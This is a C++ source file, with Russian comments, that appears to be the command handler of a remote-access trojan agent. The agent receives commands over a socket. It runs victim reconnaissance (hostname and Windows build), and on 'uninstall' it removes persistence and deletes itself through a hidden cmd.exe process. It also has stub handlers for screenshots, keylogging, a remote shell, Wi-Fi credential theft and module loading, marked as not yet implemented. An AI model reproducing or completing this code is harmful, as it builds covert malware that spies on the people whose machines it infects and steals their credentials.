// Core/commands.cpp (ФИНАЛЬНЫЙ — Защита + Win11 Logic)
#include "commands.h"
#include "persistence.h"
#include <windows.h>
#include <stdio.h>
#include <string>
#include <cstring>
#include <iostream> // Для std::exception

// Структура для RtlGetVersion
typedef struct _MY_OSVERSIONINFOW {
    ULONG dwOSVersionInfoSize;
    ULONG dwMajorVersion;
    ULONG dwMinorVersion;
    ULONG dwBuildNumber;
    ULONG dwPlatformId;
    WCHAR  szCSDVersion[128];
} MY_OSVERSIONINFOW;

typedef NTSTATUS (NTAPI* pRtlGetVersion)(MY_OSVERSIONINFOW*);

static void run_hidden(const char* cmd) {
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    char cmdBuf[1024];
    strcpy_s(cmdBuf, cmd);

    if (CreateProcessA(NULL, cmdBuf, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

std::string execute_builtin_command(const std::string& cmd, SOCKET sock) {
    // Логируем вход
    OutputDebugStringA("[CMD] Received: ");
    OutputDebugStringA(cmd.c_str());
    OutputDebugStringA("\n");

    // ОБЁРТКА: Любая ошибка внутри команды будет поймана здесь, 
    // чтобы агент не падал, а просто возвращал ошибку.
    try {
        if (cmd == "ping") {
            return "pong";
        } 
        else if (cmd == "info") {
            char host[MAX_COMPUTERNAME_LENGTH + 1];
            DWORD s = sizeof(host);
            if (!GetComputerNameA(host, &s)) strcpy_s(host, "Unknown");
            
            ULONG major = 0, minor = 0, build = 0; 
            HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
            if (hNtdll) {
                pRtlGetVersion pRtlGetVer = (pRtlGetVersion)GetProcAddress(hNtdll, "RtlGetVersion");
                if (pRtlGetVer) {
                    MY_OSVERSIONINFOW rovi = {0};
                    rovi.dwOSVersionInfoSize = sizeof(rovi);
                    if (pRtlGetVer(&rovi) == 0) {
                        major = rovi.dwMajorVersion;
                        minor = rovi.dwMinorVersion;
                        build = rovi.dwBuildNumber;
                    }
                }
            }
            
            // Логика отображения Windows 11
            // Ядро 10.0, но Build >= 22000 — это Windows 11
            std::string os_name = "Windows";
            if (major == 10 && build >= 22000) os_name = "Windows 11";
            else if (major == 10) os_name = "Windows 10";
            else if (major == 6) os_name = "Windows 7/8";

            char buf[256];
            sprintf_s(buf, "hostname=%s; os=%s Build %d", host, os_name.c_str(), build);
            return std::string(buf);
        } 
        else if (cmd == "uninstall") {
            OutputDebugStringA("[CMD] Executing uninstall sequence...\n");
            uninstall_persistence();
            
            char path[MAX_PATH];
            if (GetModuleFileNameA(NULL, path, MAX_PATH) > 0) {
                char del_cmd[1024];
                sprintf_s(del_cmd, "cmd.exe /c timeout /t 2 /nobreak >nul && del /f /q \"%s\"", path);
                run_hidden(del_cmd);
            }
            if (sock != INVALID_SOCKET) closesocket(sock);
            OutputDebugStringA("[CMD] Process terminating.\n");
            ExitProcess(0);
        }
        else if (cmd.find("screenshot") != std::string::npos) {
            return "SCREENSHOT_DISABLED: module not loaded";
        }
        else if (cmd.find("keylog") != std::string::npos) {
            return "KEYLOG_DISABLED";
        }
        else if (cmd.find("shell") != std::string::npos) {
            return "SHELL_DISABLED";
        }
        else if (cmd.find("steal_wifi") != std::string::npos) {
            return "STEAL_DISABLED";
        }
        else if (cmd.find("load_module") != std::string::npos) {
            return "LOAD_MODULE_DISABLED: will be implemented later";
        }
        
        return "UNKNOWN_COMMAND";
    } 
    catch (...) {
        // Если что-то упало — возвращаем ошибку, но НЕ умираем
        OutputDebugStringA("[CMD] Exception caught during command execution!\n");
        return "INTERNAL_ERROR: Command handler crashed safely";
    }
}